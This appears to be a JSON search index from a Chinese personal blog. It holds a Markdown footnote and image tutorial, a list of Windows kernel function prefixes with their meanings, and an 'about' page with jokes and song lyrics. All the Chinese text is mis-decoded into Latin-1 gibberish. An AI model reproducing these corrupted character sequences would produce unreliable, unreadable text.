å¯ä»¥æ·»åŠ æ³¨é‡Šå’Œå‚è€ƒ, è€Œä¸ä¼šä½¿æ–‡æ¡£æ­£æ–‡æ··ä¹±. å½“ä½ åˆ›å»ºè„šæ³¨æ—¶, ä¼šåœ¨æ·»åŠ è„šæ³¨å¼•ç”¨çš„ä½ç½®å‡ºç°å¸¦æœ‰é“¾æ¥çš„ä¸Šæ ‡ç¼–å·. è¯»è€…å¯ä»¥å•å‡»é“¾æ¥ä»¥è·³è‡³é¡µé¢åº•éƒ¨çš„è„šæ³¨å†…å®¹. è¦åˆ›å»ºè„šæ³¨å¼•ç”¨, è¯·åœ¨æ–¹æ‹¬å·ä¸­æ·»åŠ æ’å…¥ç¬¦å·å’Œæ ‡è¯†ç¬¦ ([^1]). æ ‡è¯†ç¬¦å¯ä»¥æ˜¯æ•°å­—æˆ–å•è¯, ä½†ä¸èƒ½åŒ…å«ç©ºæ ¼æˆ–åˆ¶è¡¨ç¬¦. æ ‡è¯†ç¬¦ä»…å°†è„šæ³¨å¼•ç”¨ä¸è„šæ³¨æœ¬èº«ç›¸å…³è” - åœ¨è„šæ³¨è¾“å‡ºä¸­, è„šæ³¨æŒ‰é¡ºåºç¼–å·. åœ¨ä¸­æ‹¬å·å†…ä½¿ç”¨æ’å…¥ç¬¦å·å’Œæ•°å­—ä»¥åŠç”¨å†’å·å’Œæ–‡æœ¬æ¥æ·»åŠ è„šæ³¨å†…å®¹ ([^1]ï¼šè¿™æ˜¯ä¸€æ®µè„šæ³¨). ä½ ä¸ä¸€å®šè¦åœ¨æ–‡æ¡£æœ«å°¾æ·»åŠ è„šæ³¨. å¯ä»¥å°†å®ƒä»¬æ”¾åœ¨é™¤åˆ—è¡¨, å¼•ç”¨å’Œè¡¨æ ¼ç­‰å…ƒç´ ä¹‹å¤–çš„ä»»ä½•ä½ç½®. è¿™æ˜¯ä¸€ä¸ªæ•°å­—è„šæ³¨[^1]. è¿™æ˜¯ä¸€ä¸ªå¸¦æ ‡ç­¾çš„è„šæ³¨[^label] [^1]: è¿™æ˜¯ä¸€ä¸ªæ•°å­—è„šæ³¨ [^label]: è¿™æ˜¯ä¸€ä¸ªå¸¦æ ‡ç­¾çš„è„šæ³¨ è¿™æ˜¯ä¸€ä¸ªæ•°å­—è„šæ³¨1. è¿™æ˜¯ä¸€ä¸ªå¸¦æ ‡ç­¾çš„è„šæ³¨2 ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:12:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Misc"],"content":"13 å›¾ç‰‡ å›¾ç‰‡çš„è¯­æ³•ä¸é“¾æ¥ç›¸ä¼¼, ä½†åŒ…å«ä¸€ä¸ªåœ¨å‰é¢çš„æ„Ÿå¹å·. ![Minion](https://octodex.github.com/images/minion.png) æˆ–è€…: ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\") The Stormtroopocat åƒé“¾æ¥ä¸€æ ·, å›¾ç‰‡ä¹Ÿå…·æœ‰è„šæ³¨æ ·å¼çš„è¯­æ³•: ![Alt text][id] The Dojocat ç¨ååœ¨æ–‡æ¡£ä¸­æä¾›å‚è€ƒå†…å®¹, ç”¨æ¥å®šä¹‰ URL çš„ä½ç½®: [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\" æŠ€å·§ LoveIt ä¸»é¢˜æä¾›äº†ä¸€ä¸ªåŒ…å«æ›´å¤šåŠŸèƒ½çš„ å›¾ç‰‡çš„ shortcode. è¿™æ˜¯ä¸€ä¸ªæ•°å­—è„šæ³¨Â â†©ï¸ è¿™æ˜¯ä¸€ä¸ªå¸¦æ ‡ç­¾çš„è„šæ³¨Â â†©ï¸ ","date":"2019-01-14","objectID":"/2019/01/basic-markdown-syntax/:13:0","tags":["Markdown"],"title":"Markdown åŸºæœ¬è¯­æ³•","uri":"/2019/01/basic-markdown-syntax/"},{"categories":["Tech"],"content":"Windowså†…æ ¸å‡½æ•°å‰ç¼€å¯ä»¥è¡¨æ˜å‡½æ•°ä½œç”¨ï¼Œç‰¹æ­¤æ€»ç»“å­¦ä¹ ã€‚","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/","tags":["Security","Widnowså†…æ ¸å‡½æ•°"],"title":"Windowså†…æ ¸å‡½æ•°å‰ç¼€ç®€è¿°","uri":"/WindowsDev/WindowsKernel/"},{"categories":["Tech"],"content":"Windowså†…æ ¸å‡½æ•°å‰ç¼€ç®€è¿° Windowså†…æ ¸å‡½æ•°æ˜¯Windowså†…æ ¸å¼€å‘ä¸­å¿…é¡»è¦ç†Ÿæ‚‰çš„å‡½æ•°ï¼Œå…¶æ¯ä¸ªå‡½æ•°å‘½åä¸€èˆ¬éƒ½å¯ä»¥ç›´æ¥åæ˜ å‡ºå…¶ç”¨é€”å’Œä½œç”¨å¯¹è±¡ï¼Œä¸”å‡½æ•°åéƒ½æŒ‰å…¶æ‰€åœ¨çš„å±‚æ¬¡æˆ–æ¨¡å—åŠ ä¸Šäº†ç‰¹å®šçš„å‰ç¼€ã€‚äº†è§£äº†è¿™äº›å‰ç¼€ï¼Œåœ¨çœ‹åˆ°å‡½æ•°åæ—¶å°±å¤§è‡´å¯ä»¥çŸ¥é“å‡½æ•°æ‰€å±çš„å±‚æ¬¡å’Œæ¨¡å—ã€‚ç‰¹æ­¤å¯¹Windowså†…æ ¸å‡½æ•°çš„å‰ç¼€åšä¸€ä¸ªæ±‡æ€»ï¼Œæ–¹ä¾¿æŸ¥æ‰¾å’Œå­¦ä¹ Windowså†…æ ¸å‡½æ•°ã€‚ ä¸»è¦çš„Windowså†…æ ¸å‡½æ•°å‰ç¼€ç½—åˆ—å¦‚ä¸‹ï¼š Exï¼šExecutiveï¼Œæä¾›å †ç®¡ç†å’ŒåŒæ­¥æœåŠ¡ã€‚ Ntï¼šNativeï¼Œå¯¹åº”äºwin32 APIçš„å†…æ ¸å‡½æ•°ã€‚ Keï¼šå†…æ ¸å±‚ï¼Œæ‰€æœ‰å¤šçº¿ç¨‹å’Œå¤šå¤„ç†å™¨çš„ä½ç­‰çº§åŒæ­¥æ´»åŠ¨éƒ½å‘ç”Ÿåœ¨å†…æ ¸ä¸­ã€‚ Zwï¼šWin32å­ç³»ç»Ÿå­˜åœ¨äºç”¨æˆ·æ¨¡å¼ä¸­ï¼Œæ‰€ä»¥ç”¨æˆ·æ¨¡å¼ä¸­çš„åº”ç”¨ç¨‹åºå¯ä»¥å®¹æ˜“åœ°è°ƒç”¨å…¶ä¾‹ç¨‹ã€‚ä¸ºäº†æ–¹ä¾¿ï¼ŒWindows NTåœ¨å†…æ ¸æ¨¡å¼ä¸­å®ç°äº†ä¸€äº›æœ‰Zwå‰ç¼€åçš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯ä»¥ä½¿é©±åŠ¨ç¨‹åºè°ƒç”¨Win32å­ç³»ç»Ÿä¾‹ç¨‹ã€‚ Halï¼šç¡¬ä»¶æŠ½è±¡å±‚ï¼ŒHalæ˜¯Hardware Abstraction Layerçš„ç¼©å†™ã€‚ Obï¼šå¯¹è±¡ç®¡ç†å™¨ï¼Œé›†ä¸­æ§åˆ¶Windows NTä¸­çš„å„ç§æ•°æ®å¯¹è±¡ï¼ŒWDMé©±åŠ¨ç¨‹åºä»…éœ€è¦å¯¹è±¡ç®¡ç†å™¨ç»´æŠ¤å¯¹è±¡çš„å‚è€ƒè®¡æ•°ï¼Œä»¥é˜²æ­¢å¯¹è±¡è¢«æ„å¤–åˆ é™¤ã€‚ Mmï¼šå†…å­˜ç®¡ç†å™¨ï¼Œæ§åˆ¶é¡µè¡¨ï¼Œé¡µè¡¨å®šä¹‰äº†è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ã€‚ Psï¼šè¿›ç¨‹ç»“æ„æ¨¡å—ï¼Œåˆ›å»ºå¹¶ç®¡ç†å†…æ ¸æ¨¡å¼çº¿ç¨‹ï¼Œæ™®é€šçš„WDMé©±åŠ¨ç¨‹åºåº”ä½¿ç”¨ä¸€ä¸ªç‹¬ç«‹çš„çº¿ç¨‹æ¥å¾ªæ£€æ— ä¸­æ–­ç”Ÿæˆèƒ½åŠ›çš„è®¾å¤‡ã€‚ï¼ˆPs - Processï¼‰ Seï¼šå®‰å…¨å‚è€ƒç›‘è§†å™¨ï¼Œä½¿æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åºæ‰§è¡Œå®‰å…¨æ£€æµ‹ã€‚I/Oè¯·æ±‚åˆ°è¾¾WDMé©±åŠ¨ç¨‹åºå‰å·²ç»åšå®Œäº†å®‰å…¨æ£€æµ‹ã€‚Â Ioï¼šI/Oç®¡ç†ï¼ŒåŒ…å«è®¸å¤šé©±åŠ¨ç¨‹åºå¯ä»¥ä½¿ç”¨çš„æœåŠ¡å‡½æ•°ã€‚ Fsï¼šæ–‡ä»¶ç³»ç»Ÿï¼ŒFsæ˜¯File Systemçš„ç¼©å†™ã€‚ Ccï¼šæ–‡ä»¶ç¼“å­˜ç®¡ç†ï¼ŒCcè¡¨ç¤ºCacheã€‚ Cmï¼šç³»ç»Ÿé…ç½®ç®¡ç†ï¼ŒCmæ˜¯Configuration Managerçš„ç¼©å†™ã€‚ Ppï¼šâ€œå³æ’å³ç”¨â€ç®¡ç†ï¼ŒPpè¡¨ç¤ºPnPã€‚ï¼ˆPlug and Playï¼‰ Rtlï¼šè¿è¡Œæ—¶ç¨‹åºåº“ï¼ŒRtlæ˜¯Runtime Libraryçš„ç¼©å†™ï¼ŒåŒ…å«å·¥å…·ä¾‹ç¨‹ï¼Œä¾‹å¦‚åˆ—è¡¨å’Œä¸²ç®¡ç†ä¾‹ç¨‹ï¼Œå†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºå¯ä»¥ç”¨è¿™äº›ä¾‹ç¨‹æ¥æ›¿ä»£å¸¸è§„çš„ANSIæ ‡å‡†ä¾‹ç¨‹ï¼Œå¤§éƒ¨åˆ†ä¾‹ç¨‹å¯ä»¥ä»å…¶åå­—ä¸Šç›´æ¥çœ‹å‡ºå®ƒçš„åŠŸèƒ½ã€‚ ","date":"2020-02-07","objectID":"/WindowsDev/WindowsKernel/:0:0","tags":["Security","Widnowså†…æ ¸å‡½æ•°"],"title":"Windowså†…æ ¸å‡½æ•°å‰ç¼€ç®€è¿°","uri":"/WindowsDev/WindowsKernel/"},{"categories":null,"content":"Working on ","date":"2019-08-02","objectID":"/about/:1:0","tags":null,"title":"å…³äº V4ler1an","uri":"/about/"},{"categories":null,"content":"æˆ‘æ˜¯è° Â æ¼æ´ç»ƒä¹ ç”Ÿï¼šé•¿æœŸå¤„äºæ¼æ´é¢†åŸŸçš„å­¦ä¹ å’Œç»ƒä¹ ä¸­ï¼Œä»€ä¹ˆæ—¶å€™å‡ºé“å…¨çœ‹å¤©ã€‚ Â éŸ³ä¹å¿ å®çˆ±å¥½è€…ï¼šå±äºæ²¡æœ‰éŸ³ä¹æ´»ä¸äº†çš„é‚£ç§ã€‚ Â çœ‹é›ªäºŒè¿›åˆ¶æ¼æ´ç‰ˆå—å°ç‰ˆä¸»ï¼šä½•å…¶æœ‰å¹¸èƒ½ä¸ºæ•™ä¼šæˆ‘è®¸å¤šçš„çœ‹é›ªè®ºå›è´¡çŒ®è‡ªå·±çš„ä¸€ä»½åŠ›é‡ã€‚ Â ç¾½æ¯›çƒå›½å®¶1äº¿çº§è¿åŠ¨å‘˜ï¼šé•¿æœŸç¨³å®šå æ®è¯¥ç­‰çº§ç‹è€…ä½ç½®ã€‚ Â MOBAæ¸¸æˆè¾…åŠ©è¿·ï¼šçˆ±æ‰“è¾…åŠ©ä¸æ˜¯å› ä¸ºæˆ‘èœï¼Œåªæ˜¯ä¸æƒ³æ‰“å‡»ç¥–å›½ç”µç«æœªæ¥çš„å¸Œæœ›ã€‚ Â å°åŒºæœ€å¼ºCTFerï¼šå¸¸å¹´éœ¸å å°åŒºCTFç«èµ›æ’è¡Œæ¦œç¬¬ä¸€åï¼Œä»æœªä¸‹æ¥è¿‡ã€‚ ","date":"2019-08-02","objectID":"/about/:2:0","tags":null,"title":"å…³äº V4ler1an","uri":"/about/"},{"categories":null,"content":"And / åç»­ï¼šåšå®¢åç»­åº”è¯¥ä¼šæŒç»­æ›´æ–°ï¼Œé¢‘ç‡ä¸å®š / ä½›ç³»ï¼šäººç”Ÿåœ¨ä¸–ï¼Œæ·¡ç„¶ä¸€ç‚¹ï¼Œæ‰€ä»¥ä»€ä¹ˆéƒ½çœ‹å¾—å¼€ ","date":"2019-08-02","objectID":"/about/:3:0","tags":null,"title":"å…³äº V4ler1an","uri":"/about/"},{"categories":null,"content":"å“ªé‡Œæ‰¾æˆ‘ Â WeChatè®¢é˜…å·ï¼šæŠ€æœ¯æ–‡ç« æ›´æ–°é€Ÿåº¦æ²¡æœ‰Blogå¿«ï¼Œä½†æ˜¯æˆ‘å®¶ä»™å¥³ä¼šæ›´æ–°å¥¹çš„å†…å®¹ã€‚ æœ‰æ¯’çš„çŒ« Â çœ‹é›ªä¸»é¡µ: Â Twitter: åŸºæœ¬ä»€ä¹ˆéƒ½æ²¡æœ‰-ã€‚- ","date":"2019-08-02","objectID":"/about/:4:0","tags":null,"title":"å…³äº V4ler1an","uri":"/about/"},{"categories":null,"content":"æœ€åå°±å¥‰ä¸Šæˆ‘æœ€å–œæ¬¢çš„æ­Œè¯ Iâ€™ve been reading books of old The legends and the myths Achilles and his gold Hercules and his gifts Spider-Manâ€™s control And Batman with his fists And clearly I donâ€™t see myself upon that list But she said, whereâ€™d you wanna go? How much you wanna risk? Iâ€™m not lookinâ€™ for somebody With some superhuman gifts Some superhero Some fairy-tale bliss Just something I can turn to Somebody I can kiss I want something just like this ","date":"2019-08-02","objectID":"/about/:5:0","tags":null,"title":"å…³äº V4ler1an","uri":"/about/"}]